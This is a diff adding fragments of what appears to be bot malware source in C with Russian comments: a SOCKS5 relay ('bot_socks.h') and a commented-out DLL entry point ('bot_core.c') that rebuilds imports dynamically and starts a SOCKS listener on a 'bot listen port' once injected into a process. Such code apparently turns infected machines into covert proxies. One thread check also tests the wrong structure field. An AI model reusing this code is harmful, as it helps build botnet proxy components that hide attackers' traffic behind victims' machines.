@@ -1,0 +1,94 @@
+//+ bot_socks.h
+
+	// запускаем поток получения данных от клиента для сервера
+	sConnect->sClientThreadInfo.hClient = sConnect->hClient;	// src
+	sConnect->sClientThreadInfo.hServer = sConnect->hServer;	// dst
+	sConnect->sClientThreadInfo.hThread = api.pCreateThread(NULL, 0, &SocksLoopThread, (LPVOID)&sConnect->sClientThreadInfo, CREATE_SUSPENDED, &sConnect->sClientThreadInfo.dwClientThreadId);
+	if(sConnect->sClientThreadInfo.dwClientThreadId)
+	{
+#ifdef _DEBUG_
+		DbgPrint("--- Thread for transfer from client to server started %08X\n",sConnect->sClientThreadInfo.dwClientThreadId);
+#endif
+		api.pResumeThread(sConnect->sClientThreadInfo.hThread);
+	}	else	{
+#ifdef _DEBUG_
+		DbgPrint("--- Error create Thread for transfer from client to server!!!\n");
+#endif
+		sConErr.Ver = SOCKS_VERSION;
+		sConErr.Rep = SOCKS_CONNECT_ERROR;	// error
+		socks_SEND(sConnect->hClient,&sConErr,5,"");//"error connect to dst host");
+		dwRet = -1;
+		goto error;
+
+	}
+
+	// запускаем поток получения данных от сервера клиенту
+	sConnect->sServerThreadInfo.hClient = sConnect->hServer;
+	sConnect->sServerThreadInfo.hServer = sConnect->hClient;
+	sConnect->sServerThreadInfo.hThread = api.pCreateThread(NULL, 0, &SocksLoopThread, (LPVOID)&sConnect->sServerThreadInfo, CREATE_SUSPENDED, &sConnect->sServerThreadInfo.dwClientThreadId);
+	if(sConnect->sClientThreadInfo.dwClientThreadId)
+	{
+#ifdef _DEBUG_
+		DbgPrint("--- Thread for transfer from server to client started %08X\n",sConnect->sServerThreadInfo.dwClientThreadId);
+#endif
+		api.pResumeThread(sConnect->sServerThreadInfo.hThread);
+	}	else	{
+#ifdef _DEBUG_
+		DbgPrint("--- Error create Thread for transfer from server to client!!!\n");
+#endif
+		sConErr.Ver = SOCKS_VERSION;
+		sConErr.Rep = SOCKS_CONNECT_ERROR;	// error
+		socks_SEND(sConnect->hClient,&sConErr,5,"");//"error connect to dst host");
+		dwRet = -1;
+		goto error;
+
+	} 
+
+	while(	sConnect->sClientThreadInfo.hThread != NULL )
+	{
+		api.pSleep(SOCKS_THREADS_WAIT_TIME);
+	}
+
+
+//----------------------------------------------------------------------
+
+
+
+
+//+ bot_core.c
+	/*switch(fdwReason)
+	{
+	case DLL_PROCESS_ATTACH:
+		{	/*  Вызывается 1 раз, при подгрузке DLL'ки в адресное пространство процесса.
+				Тут мы востанавливаем динамически импорт ( грубо говоря ) и настраиваем конфигурацию
+			
+ 			if(!ReassembleImport())
+				return FALSE;
+			if(!InitConfig())
+				return FALSE;
+			break;
+		}
+	case DLL_THREAD_DETACH:
+		{
+			__asm { int 3 };
+			if(!g_bCreated || !g_hThread)
+			{
+				g_hThread = api.pOpenThread(THREAD_QUERY_INFORMATION,FALSE,g_dwThreadId);
+				if(!g_hThread)
+				{
+					g_hThread = api.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&Socks5, (LPVOID)&botOpt.uBotListenPort, 0, &g_dwThreadId);
+					if(g_hThread)
+						g_bCreated = TRUE;
+					else
+						g_bCreated = FALSE;
+				}	else	{
+					api.pCloseHandle(g_hThread);
+				}
+			}
+			break;
+		}
+	default:
+		{
+			break;
+		}
+	}*/
